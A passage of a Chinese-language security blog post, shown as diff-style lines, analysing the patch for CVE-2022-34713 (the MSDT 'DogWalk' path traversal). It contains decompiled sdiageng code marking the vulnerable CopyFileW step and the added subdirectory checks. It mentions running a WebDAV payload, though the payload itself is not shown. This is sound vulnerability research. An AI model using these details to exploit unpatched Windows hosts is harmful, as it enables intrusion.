-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>执行payload访问webdav</p>
-<h2 id="0x03-补丁分析"><a href="#0x03-补丁分析" class="headerlink" title="0x03 补丁分析"></a>0x03 补丁分析</h2><h3 id="sdiageng-SdpCopyDirectory"><a href="#sdiageng-SdpCopyDirectory" class="headerlink" title="sdiageng!SdpCopyDirectory"></a>sdiageng!SdpCopyDirectory</h3><p>位于<code>sdiageng!SdpCopyDirectory</code> (19044.1899):</p>
-<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155426628.png"></p>
-<p>添加了检查目录的逻辑。</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">SdpCopyDirectory</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aPckSource<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aTmpSDiagPath<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lsTmpSDiagPath<span class="token punctuation">;</span> <span class="token comment">// r13</span>
-  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lPckSource<span class="token punctuation">;</span> <span class="token comment">// r12</span>
-  <span class="token keyword">char</span> bFlagTurnOffCheck<span class="token punctuation">;</span> <span class="token comment">// di</span>
-  LSTATUS lRes1<span class="token punctuation">;</span> <span class="token comment">// eax</span>
-  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// r8</span>
-  <span class="token keyword">unsigned</span> __int64 lRes2<span class="token punctuation">;</span> <span class="token comment">// r9</span>
-  <span class="token keyword">char</span> <span class="token operator">*</span>hFind<span class="token punctuation">;</span> <span class="token comment">// r15</span>
-  __int64 itraceCode1<span class="token punctuation">;</span> <span class="token comment">// r8</span>
-  <span class="token keyword">int</span> dwLastError5<span class="token punctuation">;</span> <span class="token comment">// er9</span>
-  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> dwLastError2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
-  LSTATUS dwRet1<span class="token punctuation">;</span> <span class="token comment">// eax</span>
-  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// r8</span>
-  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwRet2<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
-  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sWebDavFile<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
-  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sTmpSDiagFile<span class="token punctuation">;</span> <span class="token comment">// r14</span>
-  <span class="token keyword">int</span> dwLastError3<span class="token punctuation">;</span> <span class="token comment">// er9</span>
-  __int64 itraceCode2<span class="token punctuation">;</span> <span class="token comment">// r8</span>
-  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
-  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError6<span class="token punctuation">;</span> <span class="token comment">// eax</span>
-  __int64 v21<span class="token punctuation">;</span> <span class="token comment">// r8</span>
-  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError1<span class="token punctuation">;</span> <span class="token comment">// eax</span>
-  BYTE Data<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-D0h]</span>
-  DWORD cbData<span class="token punctuation">;</span> <span class="token comment">// [rsp+34h] [rbp-CCh]</span>
-  DWORD Type<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-C8h]</span>
-  HKEY hKey<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-C0h]</span>
-  <span class="token keyword">struct</span> <span class="token class-name">_WIN32_FIND_DATAW</span> FindFileData<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-B0h]</span>
-  wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3 <span class="token operator">*</span>retaddr<span class="token punctuation">;</span> <span class="token comment">// [rsp+2E8h] [rbp+1E8h]</span>
-
-  lsTmpSDiagPath <span class="token operator">=</span> aTmpSDiagPath<span class="token punctuation">;</span>
-  lPckSource <span class="token operator">=</span> aPckSource<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> byte_7FFC50EF27F8 <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    bFlagTurnOffCheck <span class="token operator">=</span> byte_7FFC50EF2858<span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  hKey <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>                                  <span class="token comment">// TurnOffCheck Registry key turned on</span>
-  lRes1 <span class="token operator">=</span> <span class="token function">RegOpenKeyExW</span><span class="token punctuation">(</span>
-            HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>
-            L<span class="token string">"Software\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics"</span><span class="token punctuation">,</span>
-            <span class="token number">0</span><span class="token punctuation">,</span>
-            <span class="token number">0x20019u</span><span class="token punctuation">,</span>
-            <span class="token operator">&amp;</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  lRes2 <span class="token operator">=</span> lRes1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> lRes1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-    lRes2 <span class="token operator">=</span> lRes1<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>lRes2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>i64 <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x7EA</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> lRes2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-TURNOFFCHECK_OFF<span class="token operator">:</span>
-    bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hKey <span class="token punctuation">)</span>
-    <span class="token keyword">goto</span> TURNOFFCHECK_OFF<span class="token punctuation">;</span>
-  <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-  Type <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
-  cbData <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
-  dwRet1 <span class="token operator">=</span> <span class="token function">RegQueryValueExW</span><span class="token punctuation">(</span>hKey<span class="token punctuation">,</span> L<span class="token string">"TurnOffCheck"</span><span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Type<span class="token punctuation">,</span> Data<span class="token punctuation">,</span> <span class="token operator">&amp;</span>cbData<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  dwRet2 <span class="token operator">=</span> dwRet1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-    dwRet2 <span class="token operator">=</span> dwRet1<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet2 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-    wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x7FB</span><span class="token punctuation">,</span> v13<span class="token punctuation">,</span> dwRet2<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> hKey <span class="token punctuation">)</span>
-    <span class="token function">RegCloseKey</span><span class="token punctuation">(</span>hKey<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwRet2 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token operator">*</span>Data<span class="token punctuation">)</span> <span class="token punctuation">)</span>
-    bFlagTurnOffCheck <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-  byte_7FFC50EF2858 <span class="token operator">=</span> bFlagTurnOffCheck<span class="token punctuation">;</span>
-  byte_7FFC50EF27F8 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-DEBUG_TRACE1<span class="token operator">:</span>
-  hFind <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>lPckSource <span class="token punctuation">)</span>                            <span class="token comment">// Check arguments for errors</span>
-  <span class="token punctuation">{</span>
-    itraceCode1 <span class="token operator">=</span> <span class="token number">2103</span>i64<span class="token punctuation">;</span>
-DEBUG_TRACE2<span class="token operator">:</span>
-    dwLastError5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>
-DEBUG_TRACE3<span class="token operator">:</span>
-    dwLastError2 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>
-    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpCopyDirectory"</span><span class="token punctuation">,</span> itraceCode1<span class="token punctuation">,</span> dwLastError5<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> dwLastError2<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>lsTmpSDiagPath <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    itraceCode1 <span class="token operator">=</span> <span class="token number">2104</span>i64<span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> DEBUG_TRACE2<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  sWebDavFile <span class="token operator">=</span> operator new<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x208u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>sWebDavFile <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    dwLastError5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>
-    itraceCode1 <span class="token operator">=</span> <span class="token number">2107</span>i64<span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> DEBUG_TRACE3<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  sTmpSDiagFile <span class="token operator">=</span> operator new<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x208u</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>sTmpSDiagFile <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    dwLastError3 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>
-    itraceCode2 <span class="token operator">=</span> <span class="token number">2110</span>i64<span class="token punctuation">;</span>
-    dwLastError2 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024882</span><span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> DEBUG_TRACE5<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\*"</span><span class="token punctuation">,</span> lPckSource<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    itraceCode2 <span class="token operator">=</span> <span class="token number">2113</span>i64<span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> DEBUG_TRACE4<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  hFind <span class="token operator">=</span> <span class="token function">FindFirstFileW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Search for file or directory in WebDavRoot\*</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>hFind <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFFFFFFFFFFFFFFDu</span>i64 <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    <span class="token keyword">do</span>
-    <span class="token punctuation">{</span>
-      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>FindFileData<span class="token punctuation">.</span>dwFileAttributes <span class="token operator">&amp;</span> FILE_ATTRIBUTE_DIRECTORY<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// Isn't it a directory? Setup sWebDavFile and sTmpSDiagFile</span>
-      <span class="token punctuation">{</span>
-        dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\%s"</span><span class="token punctuation">,</span> lPckSource<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-        <span class="token punctuation">{</span>
-          itraceCode2 <span class="token operator">=</span> <span class="token number">2134</span>i64<span class="token punctuation">;</span>
-DEBUG_TRACE4<span class="token operator">:</span>
-          dwLastError3 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
-DEBUG_TRACE5<span class="token operator">:</span>
-          <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpCopyDirectory"</span><span class="token punctuation">,</span> itraceCode2<span class="token punctuation">,</span> dwLastError3<span class="token punctuation">)</span><span class="token punctuation">;</span>
-          <span class="token keyword">break</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        dwLastError4 <span class="token operator">=</span> <span class="token function">StringCchPrintfW</span><span class="token punctuation">(</span>sTmpSDiagFile<span class="token punctuation">,</span> <span class="token number">260</span>i64<span class="token punctuation">,</span> L<span class="token string">"%s\\%s"</span><span class="token punctuation">,</span> lsTmpSDiagPath<span class="token punctuation">,</span> FindFileData<span class="token punctuation">.</span>cFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
-        dwLastError2 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-        <span class="token punctuation">{</span>
-          itraceCode2 <span class="token operator">=</span> <span class="token number">0x85D</span>i64<span class="token punctuation">;</span>
-          <span class="token keyword">goto</span> DEBUG_TRACE4<span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> bFlagTurnOffCheck <span class="token punctuation">)</span>                <span class="token comment">// Is TurnOffCheck turned off?</span>
-        <span class="token punctuation">{</span>
-          <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-          dwLastError6 <span class="token operator">=</span> <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span>lPckSource<span class="token punctuation">,</span> sWebDavFile<span class="token punctuation">,</span> Data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check if any WebDav file is sub-directory of package source </span>
-          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError6 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-            <span class="token keyword">goto</span> REPORT_FAILURE<span class="token punctuation">;</span>
-          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>Data <span class="token punctuation">)</span>
-            <span class="token keyword">continue</span><span class="token punctuation">;</span>
-          <span class="token operator">*</span>Data <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-          dwLastError6 <span class="token operator">=</span> <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span>lsTmpSDiagPath<span class="token punctuation">,</span> sTmpSDiagFile<span class="token punctuation">,</span> Data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Check if any file at %TMP\SDIAG_random-clsid is sub-directory of folder %TMP%\SDIAG_random-clsid</span>
-          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError6 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-          <span class="token punctuation">{</span>
-REPORT_FAILURE<span class="token operator">:</span>
-            wil<span class="token operator">::</span>details<span class="token operator">::</span>in1diag3<span class="token operator">::</span><span class="token function">_Log_Hr</span><span class="token punctuation">(</span>retaddr<span class="token punctuation">,</span> <span class="token number">0x80D</span><span class="token punctuation">,</span> v21<span class="token punctuation">,</span> dwLastError6<span class="token punctuation">)</span><span class="token punctuation">;</span>
-            <span class="token keyword">continue</span><span class="token punctuation">;</span>
-          <span class="token punctuation">}</span>
-          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>Data <span class="token punctuation">)</span>                         <span class="token comment">// Result is stored at "Data": *Data=0x1 =&gt; CopyFile, if not: continue. </span>
-                                                <span class="token comment">// So this is actually the ##DogWalk vuln check.</span>
-            <span class="token keyword">continue</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">CopyFileW</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">,</span> sTmpSDiagFile<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// Vulnerable CopyFile op</span>
-        <span class="token punctuation">{</span>
-          dwLastError2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-        <span class="token punctuation">}</span>
-        <span class="token keyword">else</span>
-        <span class="token punctuation">{</span>
-          dwLastError1 <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-          dwLastError2 <span class="token operator">=</span> dwLastError1 <span class="token operator">|</span> <span class="token number">0x80070000</span><span class="token punctuation">;</span>
-          <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-            dwLastError2 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>
-          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>dwLastError2 <span class="token operator">&amp;</span> <span class="token number">0x80000000</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
-          <span class="token punctuation">{</span>
-            dwLastError3 <span class="token operator">=</span> dwLastError2<span class="token punctuation">;</span>
-            itraceCode2 <span class="token operator">=</span> <span class="token number">2151</span>i64<span class="token punctuation">;</span>
-            <span class="token keyword">goto</span> DEBUG_TRACE5<span class="token punctuation">;</span>
-          <span class="token punctuation">}</span>
-        <span class="token punctuation">}</span>
-      <span class="token punctuation">}</span>
-    <span class="token punctuation">}</span>
-    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">FindNextFileW</span><span class="token punctuation">(</span>hFind<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// File Search</span>
-  <span class="token punctuation">}</span>
-  operator <span class="token function">delete</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> sTmpSDiagFile <span class="token punctuation">)</span>
-    operator <span class="token function">delete</span><span class="token punctuation">(</span>sTmpSDiagFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>hFind <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFFFFFFFFFFFFFFDu</span>i64 <span class="token punctuation">)</span>
-    <span class="token function">FindClose</span><span class="token punctuation">(</span>hFind<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> dwLastError2<span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>读取TurnoffCheck设置。  检查参数是否有错误。  检查WebDAVROOT中是否存在文件夹或文件\，如果存在则继续。  如果turnoffcheck setup，则copyfile不进行其他检查。  否则，检查是否有任何WebDAV文件是包源的子目录。  然后，检查是否有任何文件是文件夹%tmp%\sdiag_random-clsid的子目录。  如果*data=1，则copyfile，否则文件/文件夹搜索将继续。 </p>
-<h3 id="sdiageng-SdpIsSubDirectory"><a href="#sdiageng-SdpIsSubDirectory" class="headerlink" title="sdiageng!SdpIsSubDirectory"></a>sdiageng!SdpIsSubDirectory</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aParentDir<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aChildDir<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>aData<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-  <span class="token keyword">int</span> <span class="token operator">*</span>lData<span class="token punctuation">;</span> <span class="token comment">// r14</span>
-  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lChildDir<span class="token punctuation">;</span> <span class="token comment">// r12</span>
-  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir3<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
-  <span class="token class-name">size_t</span> iLenParentDir<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
-  <span class="token keyword">unsigned</span> __int64 iLenChildDir<span class="token punctuation">;</span> <span class="token comment">// rbp</span>
-  __int64 itraceCode1<span class="token punctuation">;</span> <span class="token comment">// r8</span>
-  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError1<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
-  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
-  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir2<span class="token punctuation">;</span> <span class="token comment">// r15</span>
-  <span class="token keyword">int</span> dwLastError3<span class="token punctuation">;</span> <span class="token comment">// er9</span>
-  __int64 itraceCode3<span class="token punctuation">;</span> <span class="token comment">// r8</span>
-  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError5<span class="token punctuation">;</span> <span class="token comment">// eax</span>
-  <span class="token keyword">int</span> dwLastError2<span class="token punctuation">;</span> <span class="token comment">// er9</span>
-  __int64 itraceCode2<span class="token punctuation">;</span> <span class="token comment">// r8</span>
-  __int64 iCharCounter1<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
-  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
-  __int64 iCharCounter2<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
-  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir2<span class="token punctuation">;</span> <span class="token comment">// rax</span>
-  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir1<span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp+8h]</span>
-  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir1<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp+20h]</span>
-
-  lData <span class="token operator">=</span> aData<span class="token punctuation">;</span>
-  sParentDir1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
-  lChildDir <span class="token operator">=</span> aChildDir<span class="token punctuation">;</span>
-  sChildDir1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
-  sChildDir3 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
-  iLenParentDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
-  iLenChildDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aParentDir <span class="token punctuation">)</span>                            <span class="token comment">// Check arguments for errors</span>
-  <span class="token punctuation">{</span>
-    itraceCode1 <span class="token operator">=</span> <span class="token number">1957</span>i64<span class="token punctuation">;</span>
-DEBUG_TRACE1<span class="token operator">:</span>
-    dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>
-    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode1<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> dwLastError1<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aChildDir <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    itraceCode1 <span class="token operator">=</span> <span class="token number">1958</span>i64<span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aData <span class="token punctuation">)</span>
-  <span class="token punctuation">{</span>
-    itraceCode1 <span class="token operator">=</span> <span class="token number">1959</span>i64<span class="token punctuation">;</span>
-    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
